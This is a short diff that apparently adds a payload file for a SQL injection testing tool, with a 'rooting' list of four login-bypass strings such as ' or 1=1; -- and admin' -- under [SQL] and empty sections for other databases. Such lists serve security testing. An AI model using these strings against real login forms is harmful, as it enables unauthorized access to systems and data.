@@ -1,0 +1,12 @@
+[SQL]
+rooting: ["' or 1=1; --", "admin' --", "root' or 1=1 --", "admin' or 1=1 --"]
+
+[MySQL]
+
+[PGSQL]
+
+[Oracle]
+
+[Access]
+
+[Others]
